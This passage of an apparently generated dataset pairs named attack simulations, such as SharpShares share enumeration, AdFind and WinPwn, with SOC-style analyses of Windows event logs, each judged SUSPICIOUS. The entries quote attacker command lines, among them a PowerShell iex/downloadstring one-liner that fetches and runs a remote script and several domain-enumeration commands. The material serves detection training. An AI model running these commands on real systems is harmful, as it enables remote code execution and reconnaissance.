4. **Monitoring:** Increase monitoring on `SERVER002` for any further suspicious activities or command executions that might suggest compromise.

The execution of `net.exe` with such arguments demands attention and understanding of whether this is part of an expected administrative task or a potential misuse vector."
List Google Chrome - Opera Bookmarks on Windows with powershell,"Upon reviewing the provided event logs, here is a detailed analysis:

### Overview:
The logs include various normal system activities such as updates, system process executions, and service starting actions. However, there are certain entries that suggest potentially suspicious activity which warrants further investigation.

### Detailed Analysis:

1. **Unusual PowerShell Activity:**
   - **Sysmon Log (EventRecordID 17959 and 17960):** Shows the execution of `powershell.exe` with a command to search through user directories for items named ""Bookmarks"" with recursion.
   - **PowerShell Log:** Corresponds with this activity confirming the command was executed and the session transition from available to stopped.
   - **Assessment:** The command uses PowerShell to gather files from user directories, indicating potential data enumeration or collection activities, which could be considered suspicious depending on the context (e.g., was this command part of an approved script or task).

2. **Frequent Use of Wevtutil.exe:**
   - **Sysmon Log (EventRecordIDs 17933 to 17991):** Multiple invocations of `wevtutil.exe` possibly suggest interaction with event logs. While this can be legitimate under administrative actions, frequent and regular use can also indicate log clearing or tampering attempts.
   - **Assessment:** Given no direct evidence of log removal, this could still represent valid administrative tasks but does not align with typical benign patterns in a non-maintenance timeframe.

3. **Microsoft Edge Update Activity:**
   - **Sysmon Log:** Numerous executions of Microsoft Edge updater processes for updates and installations, which could be benign if part of routine updates.
   - **Application Log:** Indicates the stopping of Edge update services, reflecting typical update process behavior.
   - **Assessment:** This series of events appears typical for a software updating process and lacks indicators of compromise.

4. **Utilization of Hostname and Whoami:**
   - Commands like `hostname.exe` and `whoami.exe` logged with high integrity context users could result from debugging or administrative scripting. They generally appear benign but are used in lateral movement in a malicious context.
   - **Assessment:** These tasks alone aren't particularly suspicious without additional context of network compromise or prior anomalies.

### Conclusion:

While multiple activities noted could warrant further scrutiny, especially regarding PowerShell usage for recursive file searches and potentially excessive use of `wevtutil.exe`, these are not conclusive evidence of malicious activity without additional context or surrounding threat indicators. 

### Resolution:
- **SUSPICIOUS** - These logs contain activities, particularly with PowerShell and `wevtutil.exe`, that appear unusual and warrant further investigation to ensure these actions correspond with authorized use and are not indicative of a hidden threat or preparation for further exploitation.

### Guidance Moving Forward:
- **Verify the Origin**: Check for any scheduled tasks, scripts, or automated processes that might have triggered these PowerShell commands.
- **User Validation**: Confirm the `admin_test` user and any associated scripts for legitimacy and authorization.
- **Policy Review**: Inspect GPOs or security parameters that could affect event log configurations, assessing for any unintended consequences or exploitable gaps.
- **Continuous Monitoring**: Heighten vigilance for any other corresponding events, such as unauthorized access attempts or network connections emanating from the involved host. 

Collaborate with the IT admin department to confirm and cross-reference these findings with known operational schedules to rule out innocuous explanations."
Adfind -Listing password policy,"Based on my analysis of the provided logs, here is a detailed assessment:

1. **PowerShell Logs:** 
   - No logs were provided for evaluation, so we cannot assess PowerShell activity.

2. **System and Application Logs:**
   - Services related to the `edgeupdate` application stopped multiple times within a short span of time (""Service stopped""). The presence of updates is expected behavior within an organizational environment where Microsoft Edge might be updated automatically.
   - `Windows Defender` logs indicate the security product is active (""SECURITY_PRODUCT_STATE_ON""), suggesting that antivirus is operational and no unusual threats were identified here.

3. **Security Logs:**
   - Event ID 4624 denotes a successful logon event. It indicates this logon session was likely part of system operation (""LogonType"":""5"" = Service Logon).
   - Event ID 4672 involves the awarding of special privileges (including `SeDebugPrivilege`) which might be concerning if associated with unusual users, but here it’s associated with the `SYSTEM` user, a standard occurrence for system operations.

4. **Sysmon Logs:**
   - Events involve typical Microsoft Edge Update operations, with processes related to Microsoft Edge being launched and terminated. These processes are running as `NT AUTHORITY\SYSTEM`, which is common for update processes.
   - The use of `whoami.exe`, `cmd.exe`, and the presence of `AdFind.exe` has potential for scrutiny. The `AdFind` tool is often associated with enumeration actions in a network which could indicate preparation for lateral movement or another form of unauthorized reconnaissance. This tool can be used both for legitimate administration and potentially malicious reconnaissance of network resources.

**Conclusion and Recommendation:**

Given the sequence of events, the logs largely show processes consistent with software update operations for Microsoft Edge under the `NT AUTHORITY\SYSTEM` context, suggesting potentially routine system administrative operations. However, the specific execution of `cmd.exe` with parameters pointing to `AdFind.exe` can be atypical depending upon the standard operations and user permissions in the organization. 

- **Resolution:** **SUSPICIOUS**

**Recommendation:**
Further investigation is warranted primarily concerning the execution of `AdFind.exe` to determine the legitimacy of its use. Confirm the identity of `SERVER002\admin_test` account activity and whether it aligns with standard administrative activities. Check organizational policies to verify whether this sort of enumeration tool is typically employed by administrators or if it's unauthorized in this context. Consider closer monitoring of this host and the involved user account for any further signs of anomalous behavior."
Enumerate All Network Shares with SharpShares,"The provided logs include Sysmon, Application, Windows PowerShell, and contain various events such as process creations and file executions. Here is a breakdown of the analysis:

### Suspicious or Anomalous Behaviors:

1. **PowerShell and SharpShares Execution:**
   - **Sysmon Logs:**
     - Command `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` with the execution of `SharpShares.exe` appears frequently.
     - **Command Line:**  
       ```powershell
       ""powershell.exe"" & {cmd /c 'C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\SharpShares.exe' /ldap:all | out-file -filepath ""$env:temp\dataSharpSharesOutput.txt""}
       ```
     - The use of PowerShell to execute `SharpShares.exe`, a tool commonly used for enumeration of network shares, is a red flag and potentially indicates reconnaissance activities.
2. **Unusual Command Line Execution:**
   - **SharpShares Command:**  
     ```cmd
     ""C:\Windows\system32\cmd.exe"" /c C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\SharpShares.exe /ldap:all
     ```
   - The path and nature of these commands suggest an unusual operation carried out through CLI, often indicative of lateral movement or network scanning.
3. **Frequent use of `conhost.exe`:**
   - It frequently appears alongside PowerShell, `wevtutil.exe`, and other utilities without clear context. This might be benign system activity but usually merits closer inspection considering the suspicious processes surrounding it.

### Indicators of Malicious Activity:
- The presence of `SharpShares.exe` being executed through PowerShell.
- Execution paths involving the `Temp` directory, which is often used by malware for scripting payloads.
- PowerShell scripts running commands that anonymize file paths or program execution, which is a common technique in obfuscating malicious activity.

### Assessment:

Based on the observed behavior in the logs, the activities surrounding the use of PowerShell to execute SharpShares and the command line arguments used, indicate suspicious behavior that aligns with potential reconnaissance or lateral movement activities within the network. There is no definitive evidence of immediate harm or compromise (e.g., no deletions, unauthorized data exfiltration) but the context in which these processes are being executed is irregular and warrants further examination.

### Resolution:
- **Resolution:** SUSPICIOUS

### Recommendations:
1. **Further Investigation:**
   - Review network traffic originating from or directed to `Server002` to check for any attempts at unauthorized access or data exfiltration.
   - Investigate the presence and legitimacy of `SharpShares.exe` on the system, including how it was introduced.
2. **Immediate Response:**
   - Consider isolating the host from the network until thorough investigation confirms no malicious activity.
   - Validate the accounts and privileges of users executing these commands, ensuring they align with expected behavior.
3. **Monitoring and Alerting:**
   - Enhance monitoring, particularly for PowerShell activities and command line executions involving `conhost.exe` and `wevtutil.exe`.
   - Set up alerts for similar patterns indicative of reconnaissance or lateral movement tools.

This analysis identifies potentially suspicious behavior that necessitates further investigation to ensure network security is not compromised."
Process Discovery - Process Hacker,"**Detailed Analysis of Windows Event Logs**

1. **Windows PowerShell Log:**
   - Multiple entries show the execution of PowerShell with a command that starts `Process Hacker`, a tool often used for debugging, testing, and process manipulation. This application can also be used maliciously for process injection or malware development. The PowerShell command is executed with inline script execution linked to `Process Hacker`.
   - The command is: `powershell.exe & {Start-Process -FilePath ""$Env:ProgramFiles\\Process Hacker 2\\ProcessHacker.exe""}`. This indicates a direct attempt to execute an application meant to manipulate or inspect system processes.

2. **Security Log (Event ID 4799):**
   - This log indicates group membership enumeration. The `CallerProcessName` is a temporary `setup.exe` from the `Microsoft Edge Update` directory, which is a standard path for Edge updates. However, this action can be leveraged to understand permissions and could precede a privilege escalation attempt or lateral movement.

3. **Sysmon Log:**
   - An active PowerShell process (`C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`) is running under the user `SERVER002\\admin_test`. This is consistent with the PowerShell log. 
   - Frequent invocation of `whoami.exe` and `hostname.exe` may indicate a script or attacker determining the system user context and network configuration.
   - Other processes like `conhost.exe` and `wevtutil.exe` are being run frequently, which often happens during command-line script execution or when manipulating event logs, indicative of potential cover-up or manipulation attempts.
   - The process `SecureBootEncodeUEFI.exe` running as `NT AUTHORITY\\SYSTEM` suggests a legitimate system-level operation, likely benign if not connected with malicious script.

4. **Unusual Patterns:**
   - The focus on using supposedly legitimate tools like PowerShell and Process Hacker indicates an attempt to camouflage behavior under the guise of legitimate administration.
   - Process execution sequences indicate process manipulation and possible reconnaissance activities.

**Assessment:**
The use of PowerShell to start `Process Hacker` sets off alarms due to `Process Hacker`'s dual-use capabilities and history in system manipulations by malicious actors. Additionally, scripts querying system and user details, alongside PowerShell's flexibility, could point towards an intrusion attempt or internal reconnaissance. 

**Resolution:**
- **SUSPICIOUS** - Although the presence of legitimate tools complicates a straightforward determination, the sequence and use of these tools for system inspection or manipulation within a short time frame require further investigation.
  
**Guidance on How to Proceed:**
- Verify if `Process Hacker` is authorized and necessary on the system; remove or restrict if not.
- Check for any unauthorized changes to system configurations.
- Conduct a deeper dive into user activity logs around the same timeframe, focusing on `SERVER002\\admin_test`.
- Increase monitoring of PowerShell executions and run additional scans for unauthorized scripts or changes.
- Evaluate network traffic for unusual correlations around the log timings."
Network Share Discovery PowerShell,"The provided logs offer a view of activities around system processes, PowerShell actions, and services related to the Microsoft Edge Update. I'll go through the relevant sections of the logs to identify potential anomalies or signs of malicious activity.

### Detailed Analysis:

1. **PowerShell Log:**
   - The logs indicate a PowerShell command was executed: `powershell.exe & {get-smbshare}`. This command is used to display SMB shares. While in itself, this command is not inherently malicious, frequent use or execution by unfamiliar accounts might suggest reconnaissance activity, especially if the command wasn't expected. However, in this context, there's no indication that the use of this command was unauthorized.

2. **Sysmon Log:**
   - Several Sysmon logs feature execution of processes under 'NT AUTHORITY\SYSTEM' which is standard for system-related processes, notably the Microsoft Edge Update processes and `sppsvc.exe` (Software Protection Platform Service). These appear routine for updates and normal system operations.
   - The repeated execution of `wevtutil.exe` (a command-line utility for managing event logs) by the user `SERVER002\admin_test` is somewhat curious. If this was unexpected, it might signify someone trying to manipulate or clear logs, which is a red flag often associated with malicious intent. However, given no additional suspicious patterns associated with it, it doesn't unilaterally indicate compromise without further context.
   - Processes like `conhost.exe`, `whoami.exe`, and `hostname.exe` running with commands like ""checking user or system details"" can suggest an admin session reviewing system info, but it could equally fall under routine administrative tasks.

3. **Other Observations:**
   - The logs further show typical application lifecycle events like service stops and starts (`edgeupdate` service marked stopped), which in isolation do not suggest malice.
   - No ""Security logs"" were provided, which could contain important information. Since no explicit malicious activity could be determined from provided sections alone, evaluating the security logs could afford additional context.

### Assessment:

Given the information available from the logs:
- **PowerShell** activities seem benign, given the apparent command intent. 
- **Sysmon** activities align with regular updates and some administrative work.
- **Application** logs show expected service behavior with the Edge Update stopping, which aligns logically with the Sysmon entries beginning several seconds afterward.
  
The most notable aspect is the repeated execution of `wevtutil.exe` by an admin account in a short window, but lacking further corroborating evidence from the Security logs or alerts, it’s not sufficient to declare malicious conduct definitively.

### Recommendation:

- **Resolution: SUSPICIOUS** - While there's no outright proof of malicious activity, the behavior of `wevtutil.exe` under an admin context should be checked further. Verify with the admin user if these actions aligned with typical activity expected during that period.
- Further investigation should involve:
  - Cross-referencing against any detection alerts that might correlate with this log data.
  - Engaging the admin user(s) with the `SERVER002\admin_test` account to validate log-related actions.
  - Checking for any follow-up events or abnormalities post the log entries time frame.

Additional context from a broader set of logs or endpoint alerts would solidify understanding and definitively categorize the activity."
WinPwn - RBCD-Check,"Upon analyzing the provided Windows event logs, several findings can be noted. Here's a detailed breakdown:

1. **Sysmon Logs:**
   - The execution of `whoami.exe`, `hostname.exe`, and other built-in utilities like `wevtutil.exe` and `conhost.exe` by the user `admin_test` are generally benign activities but do indicate scripts or automated tasks being run. However, these are command-line executions and can be leveraged for reconnaissance or script execution.
   - The critical piece here is the execution of a PowerShell command:
     ```
     ""powershell.exe"" & {$script_repo='https://raw.githubusercontent.com/script', iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1'), RBCD-Check -consoleoutput -noninteractive}
     ```
     - The use of `Invoke-Expression` (`iex`) and downloading a script from an external source (GitHub) is a common method used in malicious activities to download and execute a script that can perform a variety of harmful tasks. This particular action is very suspicious.

2. **Windows PowerShell Logs:**
   - Confirm the execution of the same PowerShell command that downloads and executes a script from a remote repository. This strongly suggests that an unauthorized, potentially harmful script was executed.

3. **Security Logs:**
   - The logs identify the `admin_test` user with several high-level privileges, which increases the risk if the account is compromised.
   - A logon event (ID 4624) and a special privileges assignment (ID 4672) are recorded, which indicate successful authentication and potentially privilege escalation.

4. **Analysis Summary:**
   - The critical concern is the use of PowerShell to download and execute a script from a GitHub repository. The presence of this command and the method (using `Invoke-WebRequest` in PowerShell to fetch and run a script) is indicative of potential malicious intentions or an actual compromise.
   - There are no explicit logs showing malware execution; however, the entire context around the PowerShell script download and execution raise significant concerns that warrant further investigation.

**Resolution:** SUSPICIOUS

- **Guidance:** The presence of PowerShell downloading and executing a script from an external source without clear justification is suspicious and should be thoroughly investigated. Immediate steps should include:
  - Identifying and examining the downloaded script to understand its functionality.
  - Investigating the user `admin_test` activity further for any unauthorized access or privilege misuse.
  - Reviewing network logs for any unusual outbound or inbound connections from `Server002`.
  - Changing credentials for `admin_test` and any other potentially affected accounts.
  - Implementing restrictions or monitoring policies for PowerShell usage, especially commands involving external downloads and `Invoke-Expression`.

This situation requires immediate containment actions and possibly a broader investigation into potential lateral movement or data exfiltration efforts in the network."
Remote System Discovery - net,"After a thorough review of the provided log entries across different Windows event logs (System, PowerShell, Application, Security, and Sysmon), here is the detailed analysis:

### Summary of Logs:

1. **System Log:**
    - Routine kernel general and time service logs.
    - Windows update logs related to a Security Intelligence Update for Microsoft Defender Antivirus are present. This is considered normal behavior for ensuring antivirus definitions are up to date.

2. **PowerShell Log:**
    - The PowerShell log shows the start of multiple providers with execution by `wsmprovhost.exe` in an embedded mode. No suspicious command-line activity or interaction is recorded.

3. **Application Log:**
    - Activity from Windows Defender and Software Protection Platform Service is standard and shows typical operation like security product status being on and valid licensing interactions.

4. **Security Log:**
    - Multiple 4624 (successful logon) and 4672 (privilege assignment) events related to the user `admin_test`. These events indicate network logons via NTLM from the IP `192.168.0.102` and some IPv6 address, showing usage from possibly the same workstation. The admin_test account has numerous elevated privileges.
    - Event 5379 denotes credential validation failures, but this could occur due to incorrect password attempts or mismatches, which should be monitored but not conclusive of malicious activity alone.

5. **Sysmon Log:**
    - Several process creations are logged. Notably, there are:
        - Execution of `whoami.exe` and `hostname.exe`, indicating typical system enumeration by `admin_test`.
        - Usage of `wevtutil.exe`, and multiple uses of `net view`, which suggests systems/services enumeration - a pattern that could indicate exploration from a position of elevated access.
        - Execution of `cmd.exe` with its command-line arguments showing network exploration.
        - Regular system update tasks with Microsoft Edge updates and use of `svchost.exe`, all attributable to maintenance/updating tasks by Microsoft services.

### Initial Findings and Analysis:

- The logs show a pattern of typical operations, including a standard load of security updates and validation by Microsoft services.
- Frequent logon events and privilege assignments to `admin_test` stand out, but could be legitimate given the responsibilities of the user associated with that account.
- The use of network enumeration tools (`net view`) could potentially be an indicator of lateral movement or reconnaissance; however, if these actions were initiated by an authorized admin conducting regular maintenance or checks, they would be legitimate.
- No explicit malicious signatures or command line operations were observed that guarantee a compromise.

### Assessment and Recommendation:

**Resolution: SUSPICIOUS**

- Although no definitive signs of compromise were observed, the repetitive activity, particularly network enumeration and the extensive privileges of `admin_test`, necessitate further examination. This includes:
    - Verifying the legitimacy of operations performed by `admin_test`.
    - Ensuring the system’s environment and admin accounts are secure and that there were no unauthorized attempts to utilize these accounts.
    - Correlating these activities with known tasks or schedule events to ensure legitimacy.

### Guidance:

1. **User Verification:** Confirm that `admin_test` had valid reasons to perform these enumerations and privilege uses.
2. **Audit Privileges:** Review and tighten the privileges for users, ensuring only minimum necessary rights are granted.
3. **Cross-check Logs:** Consider additional log sources or historical context to determine if this type of activity has been ongoing.
4. **Network Monitoring:** Strengthen network monitoring to catch potential misuse earlier, especially interactions from or to external IPs.
5. **Security Posture Enhancement:** Continuously review and apply best security practices on account management and system monitoring to pre-empt potential compromises."
Enumerate logged on users via CMD (Local),"After careful analysis of the provided event logs, here is a detailed assessment of the system's behavior:

### Findings:
1. **Wevtutil Execution**: Wevtutil.exe was executed multiple times. This utility is generally used for querying and managing event logs. While this can be legitimate, its execution frequency and pattern can be suspicious, especially when accessed by a user or script without clear justification.
2. **Conhost Execution**: Multiple executions of conhost.exe, sometimes associated with wevtutil.exe. Conhost.exe is typically involved with console applications, so its repeated invocation could be normal or attributed to scripted automation or monitoring scripts.
3. **Host Name and Whoami Commands**: The execution of HOSTNAME.EXE and WHOAMI.EXE are relatively benign on their own but can be part of enumeration activities in a compromise. Their frequency or usage may be noteworthy if coupled with other potentially malicious activity.
4. **CMD Execution**: Cmd.exe was used with the `/c query user` command. This action directly querying user info can indicate a script or a batch file being used to gather system information, which might be suspicious if not part of a normal maintenance script.
5. **Microsoft Edge Update**: Many events related to Microsoft Edge Update processes, including commands like /update, /ping, /regserver, /regsvc, and others. These are common during routine updates but should be closely monitored to ensure they align with expected update activities given no power shell logs it indicates no external script was invoked.

### Assessment:
- **BENIGN**: The logs do provide evidence of routine and expected behaviors, such as application updates (Microsoft Edge), which include multiple executions of specific update processes. There are no definitive signs of compromise, privilege escalation, or persistence mechanisms installed in these logs.

- **SUSPICIOUS**: Despite the above, the frequent execution of utilities generally used for system information gathering (like wevtutil, hostname, whoami) and process querying could be a part of an unauthorized administration script or tool. The context in which these tools executed and any associated changes should be further reviewed.

### Recommendation:
- **Further investigation**: Given the potentially suspicious activities noted, investigate the cause and context for the wevtutil executions and the querying of system information. Verify whether these actions align with planned administrative activities or if they were executed by authorized IT personnel. 
- **Review Scheduled Tasks and Scripts**: Examine if scripts or scheduled tasks invoke these tools and whether they align with organizational policies.
- **Enhanced Monitoring**: Set up alerting rules to monitor for unusual use of administrative tools or commands indicative of reconnaissance or privilege usage gone awry.

Based on this analysis, the resolution is **SUSPICIOUS** due to behaviors that need further investigation to ensure they are sanctioned activities and not indicative of malicious behavior."
MSFT Get-GPO Cmdlet,"Upon analyzing the given Windows event logs, the following observations were made:

1. **Processes in Temp Folder:**
   - The event records indicate the execution of `DismHost.exe` from a temporary directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp`). While `DismHost.exe` is a legitimate Windows process used for imaging and servicing, its execution from a temporary folder could be indicative of suspicious or potentially malicious activity if it wasn't expected or controlled from such a location.

2. **PowerShell Usage:**
   - There are entries of PowerShell being executed with specific commands: `Get-GPO -Domain $ENV:userdnsdomain -All >> $env:temp\\GPO_Output.txt`. This command lists all Group Policy Objects and appends them to a file. While this can be a legitimate administrative task, the outputting to a temp file without clear administrative intent could raise suspicion.

3. **Frequent Use of Wevtutil.exe:**
   - There are several occurrences of `wevtutil.exe`, a system process for managing event logs, and `conhost.exe` alongside it. Excessive or unusual use of `wevtutil.exe` may indicate an attempt to export or clear event logs to cover tracks.

4. **Use of Hostname and Whoami:**
   - Execution of `hostname.exe` and `whoami.exe` can often be routine, yet if on a compromised account or unexpected, it may be part of a reconnaissance step by an attacker.

5. **Microsoft Edge Update:**
   - The logs show operations related to the updating of Microsoft Edge (`MicrosoftEdgeUpdate.exe` and its related processes). These operations, conducted under the `NT AUTHORITY\SYSTEM` account, appear benign and consistent with normal software update behavior.

6. **Overall Activity Pattern:**
   - The sequence and timing of processes, and the user account context (e.g., `SERVER002\admin_test`), raise suspicion especially activities revolving around temp directories, PowerShell usage, and event log interactions. The thoroughness and sequence suggest scripted or orchestrated actions rather than ad hoc administrative tasks.

**Assessment:**
- Resolution: **SUSPICIOUS**
- The presence of `DismHost.exe` running from a temp directory, excessive PowerShell scripting with potential GPO enumeration, and `wevtutil.exe` usage all hint towards activities that deviate from standard operations. 

**Guidance and Next Steps:**
1. **Isolate the Affected Host:** To prevent potential lateral movement or further compromise.
2. **Conduct Deeper Forensic Analysis:** Review activities around the time frame for additional context, including examining involved scripts, accessing temporary files created, and identifying unusual account activities.
3. **Audit Account Usage:** Verify administrative activities and access rights, especially for `SERVER002\admin_test`, to ensure they align with expected norms.
4. **Implement Enhanced Monitoring:** Increase scrutiny on susceptible systems for signs of similar patterns.
5. **Prepare Incident Response:** Develop remedial procedures if investigation confirms malicious intent or actors.

These directions are crafted to ensure an effective response to the potentially anomalous behavior inferred from the logs."
Enumerate Windows Security Log via WevtUtil,"I've analyzed the provided Windows event logs across the Security, System, Sysmon, and Application channels to identify any potentially suspicious activities. Here's a summary and assessment based on typical indicators of malicious activity:

### Key Observations:

1. **Time Change Events (Security & System Logs)**
   - The logs indicate multiple instances of time changes (`EventID: 4616`) executed by `svchost.exe`. Time discrepancies can occasionally be indicative of malicious activity (such as evasion), though they might also be routine system adjustments. 

2. **Privilege Use Events (Security Log)**
   - The events show `admin_test` user acquiring extensive privileges (`EventID: 4672`), including `SeDebugPrivilege`, which can be a red flag if not part of regular administrative activities. High number of privileges in logs without corresponding legitimate need can suggest potential for misuse.

3. **Logon Events (Security Log)**
   - Multiple logon events via `NTLM` protocol for the user `admin_test` from an external workstation (`DESKTOP-3HL5B2P`) use `LogonType: 3` which is a network logon. While this might be typical for remote management, it should match regular patterns or be verified for legitimacy.

4. **Suspicious Use of Wevtutil and Command Prompt (Sysmon Log)**
   - High frequency of `wevtutil` commands via `cmd.exe` by `admin_test` may indicate attempts to enumerate or manipulate event logs, commonly a tactic by attackers to obfuscate traces. 
   - Execution of `whoami.exe` tool can indicate a user verifying their privilege level, often seen during post-compromise reconnaissance.

5. **Execution of Hostname and WmiPrvSE.exe**
   - The execution of `HOSTNAME.EXE` and `WmiPrvSE.exe` by the `admin_test` user might align with typical system checks but should be examined against expected administrative actions.

6. **Service and Update Activity (Sysmon & Application Logs)**
   - There are multiple executions and updates of Microsoft Edge components. Normally benign, but could serve as a distraction. Ensure these updates are legitimately timed and sourced.

### Conclusions and Recommendations:

- **Resolution: SUSPICIOUS**: Events, such as the use of `wevtutil`, modification of times by `svchost.exe`, and acquisition of extensive privileges by `admin_test`, require further investigation to determine legitimacy. The behaviors observed could be attributed to legitimate administrative actions but show potential indicators of misuse or compromise.

### Next Steps:

1. **Communicate with IT**: Verify if these actions were part of scheduled maintenance or administrative actions by `admin_test`. Specifically, confirm the legitimacy of time changes and use of administrative tools.
2. **Review Account Activity**: Conduct a thorough review of `admin_test` account activity to validate its use and access patterns, particularly focusing on the logon origin.
3. **Confirm System Integrity**: Ensure the system's time is synchronized properly with a reliable time source.
4. **Monitor & Restrict Privileges**: Strengthen monitoring of privilege escalation events, and verify necessity for all elevated privileges acquired.
5. **Perform a Threat Hunt**: Initiate a threat hunt to rule out the presence of potential backdoors or rootkits, given the involvement of `svchost.exe` and frequent system command use.

This assessment highlights the importance of continuous monitoring and verification of administrative activities to ensure system security against potential insider threats or external compromises."
Enumerate domain computers within Active Directory using DirectorySearcher,"**Detailed Analysis of Log Entries:**

**System Log:**
- The System log entries are primarily related to Windows Update activities. The entries with Event ID 44, 43, and 19 indicate a Security Intelligence Update for Microsoft Defender Antivirus. This is typical behavior when the system updates its antivirus definitions and does not appear suspicious.

**Application Log:**
- The Application log has an entry indicating that Windows Defender is active, which is expected behavior and not suspicious.

**Security Log:**
- Most of the Security events (Event ID 5379) appear to be related to credential requests and operations associated with the server's machine account (SERVER002$) and a Microsoft Account for a user pattern (""02txoixylodcstop""). They show unsuccessful attempts indicated by the return code `3221226021`, which can suggest failed credential requests. However, these events alone, without additional context, do not necessarily indicate malicious activity.
- Event ID 4624 and 4672 show successful logons for a system account, which is expected for system services and background operations.
- The frequent 5379 events might suggest some form of misconfiguration or repeated attempts to authenticate using a Microsoft Account, which warrants further investigation to ensure it's expected and just a failed configuration or script.

**Windows PowerShell Log:**
- PowerShell events show the execution of a script that uses `System.DirectoryServices.DirectorySearcher`. This script is gathering information about computers in what appears to be a local network or directory service environment.
- Although the script is typical for querying directory information, its execution context would need to be verified (e.g., scheduled task, administrative script, etc.) to rule out unauthorized enumeration attempts. The activity itself without further context appears benign, but verifying the legitimacy of the script execution is prudent.

**Sysmon Log:**
- Sysmon logs show a series of processes and activities, including benign activities like Microsoft Edge updates (`MicrosoftEdgeUpdate.exe`) and various Windows Update components (e.g., `wuauclt.exe`, `MpSigStub.exe`).
- Powershell (`powershell.exe`) and other administrative utilities (like `wevtutil.exe, whoami.exe`) are executed by the user `admin_test`. These may be part of expected admin maintenance routines, but their occurrence should be double-checked to ensure authenticity.
- The presence of processes like `RUXIMICS.exe` or `PLUGScheduler.exe`, which do not belong to standard Windows or Microsoft components, may warrant additional scrutiny to determine if they are legitimate applications or potentially unwanted applications (PUAs).

**Assessment & Guidance:**

Overall, the logs reflect a mix of typical administrative activities, routine system updates, and some retries to authenticate using a Microsoft Account, perhaps due to a misconfiguration. Here are the main takeaways:

- **Unsuccessful Credential Operations**: The multiple `5379` events indicate potentially misconfigured service or misused credentials requiring additional review to ensure they aren't attempts of unauthorized access.
- **Powershell Usage**: The script execution is noteworthy and should be verified to ensure it aligns with expected administrative activities, especially considering it queries network or directory information.
- **Unknown Processes**: Investigate processes like `RUXIMICS.exe` or `PLUGScheduler.exe` to confirm their legitimacy within your environment.

**Resolution: SUSPICIOUS**

- While there is no direct, conclusive evidence of malicious activity in the logs, certain behaviors warrant further investigation. Specifically, the frequent unauthorized credential accesses and the unexamined processes and scripts should be verified to determinate their benign nature from a trusted source in the environment."
Suspicious LAPS Attributes Query with Get-ADComputer all properties and SearchScope,"The provided Windows event logs exhibit the following characteristics and potential indicators of suspicious or benign activity:

1. **Process Execution Patterns:**
   - Multiple instances of `wevtutil.exe` are recorded in the Sysmon log. This utility is commonly used to manage event logs. When executed in quick succession, or atypically by user accounts like `admin_test`, it could indicate log manipulation attempts, warranting further exploration.
   - `conhost.exe` is often associated with command-line operations. Its frequent appearances here align with console applications like PowerShell, which is not inherently suspicious but should be correlated with actions performed.
   - The `HOSTNAME.EXE` and `whoami.exe` are benign applications typically used for network configuration validation and user information queries.

2. **PowerShell Activity:**
   - A Windows PowerShell log reveals script execution via `powershell.exe` with a command structure including `""name -like '*'"" -Properties *`. While this syntax can be used in legitimate administrative scripts to query system information, it can also be indicative of reconnaissance activities if executed by unauthorized personnel or at odd times.

3. **Application Log and Security Logs:**
   - Normal application and security event logs, such as those involving `svchost.exe`, relate to system services and time synchronization, which are part of typical OS operations.

4. **Anomalies or Potential Threats:**
   - The repeated execution patterns of log management tools `wevtutil.exe`, especially without typical log management justification, hint at potential tampering.
   - PowerShell usage with unspecific filters could mean benign usage or could be a red flag for more subtle reconnaissance efforts.

**Assessment and Conclusion:**

The logs present a mix of ordinary operations and potential red flags, particularly focusing on the repeated execution of log and scripting utilities like `wevtutil.exe` and `PowerShell`.

- **Resolution: SUSPICIOUS** - The activities described here, especially the usage of `wevtutil.exe` in close sequence without an obvious administrative task and the use of PowerShell for broad data retrieval, prompt suspicion. They require closer examination to confirm legitimate use or detect malicious log manipulation or unauthorized reconnaissance.

**Guidance on How to Proceed:**
1. **Correlation & Context:** Check for any work tickets or scheduled tasks that could justify the scripts and utility usage within the log timeline.
2. **User Verification:** Confirm the legitimacy of the `admin_test` activities. Determine if the user account is expected to perform such operations.
3. **Event Frequency & Timing:** Analyze the timing and frequency of these actions compared to normal operations, including cross-referencing other system logs or network activity for anomalies.
4. **Additional Logging:** Increase the verbosity of logs or enable more comprehensive logging (e.g., command line history, access logs) pending approval, to capture more detailed information on subsequent user actions or process access patterns."
Enumerate all accounts (Domain),"### Analysis of Logs:

The collection of Windows event logs reveals various activities on the host ""Server002"" around the timestamp ""2024-10-23 20:46:54"" to ""2024-10-23 20:47:17"". The provided logs mainly contain entries from Sysmon with a few entries from the Application log. Below is a detailed analysis of any suspicious or anomalous behavior noted:

#### Observations from Sysmon Logs:

1. **Use of Utility Tools:**
   - There are several instances of standard Windows utilities being executed such as `whoami.exe`, `hostname.exe`, and multiple `wevtutil.exe` processes. These tools provide information about user sessions and event logs.
   - Calls to `net.exe` and `net1.exe` with arguments (`/domain`) are observed, which are suspicious as they could be used for enumeration of user and group information within the domain.

2. **Command Execution:**
   - The presence of `cmd.exe` with command-line parameters `""/c net user /domain & net group /domain""` suggests a command shell is being utilized to perform network enumeration. This is effortful intelligence gathering which may hint at reconnaissance behavior.

3. **Privilege Context:**
   - The ""IntegrityLevel"" is ""High"" for processes run by the user `SERVER002\admin_test`, indicating activities are executed with elevated privileges.

4. **Pattern Recognition:**
   - The sequence of events shows usages of utilities that are typically associated with information gathering. This potentially indicates someone is probing the host, which might be part of an initial phase of an attack.

5. **Software Installations:**
   - A series of entries involving `MicrosoftEdgeUpdate.exe`, including `setup.exe` processes, indicate Microsoft Edge update processes. These are executed under SYSTEM credentials and appear legitimate given they relate to software updates.

#### Application Logs:

- **Security-SPP (Software Protection Platform Service):** A single entry indicates routine software protection platform operations, likely related to license checks or updates.

### Assessment:

- **Analyzed Indicators:** The execution of utilities such as `whoami`, `net user /domain`, `net group /domain` in close succession, especially from a high integrity context, could be indicative of malicious intent. Such activities are consistent with reconnaissance or unauthorized information-gathering activity.
- **Context & Legitimacy:** Some activities, like the Microsoft Edge update, seem legitimate and not linked to any malicious intent. They run under NT AUTHORITY\SYSTEM context which is expected for system updates.

### Conclusion:

Based on the detailed analysis above, the logs contain suspicious activities that require further investigation to rule out or confirm malicious intent. The usage of Windows utilities and command-line executions suggests possible unauthorized information gathering.

### Resolution:

